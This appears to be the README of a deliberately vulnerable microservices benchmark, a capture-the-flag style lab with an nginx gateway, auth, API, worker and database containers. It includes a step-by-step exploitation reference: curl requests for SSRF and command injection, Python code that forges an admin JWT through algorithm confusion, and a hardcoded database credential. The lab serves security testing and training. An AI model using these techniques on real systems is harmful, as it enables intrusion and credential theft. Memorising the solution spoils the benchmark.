# S7BEN-VHARD-001: Microservices Exploitation Chain

## Overview

**Tier**: 2 (Evaluation - No Hints)
**Difficulty**: Advanced
**Category**: Attack Chains
**Architecture**: Multi-Container Microservices
**Chain Length**: 5 Steps

Multi-container microservices architecture demonstrating a complete attack chain across distributed services. Requires chaining SSRF, JWT algorithm confusion, privilege escalation, command injection, and database credential theft.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Networks                           │
│                                                              │
│  Frontend Network (Exposed)                                 │
│  ┌────────────┐                                             │
│  │   nginx    │  :80 (PUBLIC)                               │
│  │  gateway   │                                             │
│  └─────┬──────┘                                             │
│        │                                                     │
│  ──────┴─────────────────────────────────────────────       │
│                                                              │
│  Backend Network (Internal)                                 │
│        │                                                     │
│  ┌─────┴──────┐  ┌────────────┐  ┌────────────┐           │
│  │   auth     │  │    api     │  │   worker   │           │
│  │  service   │  │  service   │  │  service   │           │
│  │ (Node.js)  │  │  (Flask)   │  │    (Go)    │           │
│  │   :3000    │  │   :5000    │  │   :8080    │           │
│  └────────────┘  └─────┬──────┘  └─────┬──────┘           │
│                        │                │                    │
│  ─────────────────────┴────────────────┴──────────────      │
│                                                              │
│  Database Network (Internal)                                │
│                        │                │                    │
│                  ┌─────┴──────┐  ┌─────┴──────┐            │
│                  │  postgres  │  │   redis    │            │
│                  │     db     │  │ telemetry  │            │
│                  │   :5432    │  │   :6379    │            │
│                  └────────────┘  └────────────┘            │
└─────────────────────────────────────────────────────────────┘
```

### Services

| Service | Language | Port | Exposed | Role |
|---------|----------|------|---------|------|
| nginx-gateway | nginx | 80 | ✅ | API Gateway & Reverse Proxy |
| auth-service | Node.js | 3000 | ❌ | JWT Authentication |
| api-service | Python/Flask | 5000 | ❌ | Business Logic API |
| worker-service | Go | 8080 | ❌ | Background Job Processor |
| postgres-db | PostgreSQL | 5432 | ❌ | Database |
| redis-telemetry | Redis | 6379 | ❌ | Centralized Telemetry |

---

## Attack Chain (5 Steps)

### Step 1: SSRF to Internal Service
- **Target**: `auth-service:3000/internal/debug`
- **Vulnerability**: SSRF in api-service `/api/fetch-url`
- **Bypass**: URL filter only blocks localhost/127.0.0.1
- **Proof**: JWT configuration exposed

### Step 2: JWT Algorithm Confusion
- **Vulnerability**: auth-service accepts multiple JWT algorithms
- **Attack**: Change RS256 to HS256, sign with public key
- **Proof**: Forged admin token

### Step 3: Access Worker Debug Endpoint
- **Endpoint**: `/worker/debug`
- **Auth**: Requires admin JWT (from Step 2)
- **Proof**: Environment variables leaked (DATABASE_URL)

### Step 4: Command Injection
- **Endpoint**: `/worker/debug/execute`
- **Vulnerability**: Unsanitized command execution
- **Proof**: RCE confirmed

### Step 5: Database Credential Theft
- **Credentials**: From Step 3 environment leak
- **Access**: Direct PostgreSQL connection
- **Proof**: Flag retrieved from `secrets` table

---

## Quick Start

### Prerequisites
- Docker & Docker Compose
- curl, jq (for testing)
- Python 3.11+ (for automated exploitation)

### Start the Benchmark

```bash
cd benchmarks/S7BEN-VHARD-001
make up
```

Access: **http://localhost**

### Health Check

```bash
make test
```

### View Telemetry

```bash
curl http://localhost/api/telemetry | jq
```

---

## Exploitation Quick Reference

### Step 1: SSRF

```bash
curl -X POST http://localhost/api/fetch-url \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"url": "http://auth-service:3000/internal/debug"}'
```

### Step 2: JWT Algorithm Confusion

```python
import jwt

# Get public key from Step 1
public_key = "..."  # From SSRF response

# Forge admin token
payload = {"username": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")
```

### Step 3: Access Worker Debug

```bash
curl http://localhost/worker/debug \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "X-Session-ID: exploit-session"
```

### Step 4: Command Injection

```bash
curl -X POST http://localhost/worker/debug/execute \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"command": "cat /etc/hostname"}'
```

### Step 5: Database Access

```bash
# Extract credentials from Step 3
# Format: postgresql://apiuser:SecureDBPass12345!@postgres-db:5432/apidb

# Connect to database
psql -h localhost -p 5432 -U apiuser -d apidb

# Get flag
SELECT value FROM secrets WHERE key = 'exploitation_flag';
```

---

## Verification

```bash
curl http://localhost/api/verify \
  -H "X-Session-ID: exploit-session" | jq
```

Expected response:
```json
{
  "exploitation_successful": true,
  "chain_completed": true,
  "steps_completed": 5,
  "flag": "S7BEN{microservices_chain_...}",
  "proof": {
    "step_1": "SSRF to internal auth service",
    "step_2": "JWT algorithm confusion",
    "step_3": "Admin token forged and verified",
    "step_4": "Command injection in worker",
    "step_5": "Database credentials extracted"
  }
}
```

---

## Telemetry & Scoring

### Metrics Tracked
- ✅ Chain progress (step-by-step completion)
- ✅ Total requests count
- ✅ Endpoints accessed
- ✅ Time per step
- ✅ Stealth score (based on alerts triggered)
- ✅ Efficiency score (request economy)

### Access Telemetry

```bash
curl http://localhost/api/telemetry | jq
```

---

## Cleanup

```bash
make down
make clean
```

---

## Testing

See [TESTING.md](./TESTING.md) for comprehensive manual testing guide with detailed exploitation steps.

---

## Security Notes

- All services run in isolated Docker networks
- Database and Redis are not exposed externally
- Only nginx-gateway is accessible from host
- Rate limiting enabled (10 req/sec, burst 20)

---

## Troubleshooting

### Services won't start
```bash
make logs
```

### Reset telemetry
```bash
make reset
```

### Access service shells
```bash
make shell-api    # API service bash
make shell-db     # PostgreSQL psql
make shell-redis  # Redis CLI
```

---

## Learning Objectives

1. ✅ Understand microservices security architecture
2. ✅ Chain multiple vulnerabilities across services
3. ✅ Exploit SSRF to reach internal endpoints
4. ✅ Perform JWT algorithm confusion attacks
5. ✅ Identify command injection in Go applications
6. ✅ Leverage credential exposure for lateral movement
7. ✅ Navigate multi-service attack paths

---

## Tags

`microservices` `attack-chain` `ssrf` `jwt` `command-injection` `polyglot` `phase-4` `tier-2` `multi-container`
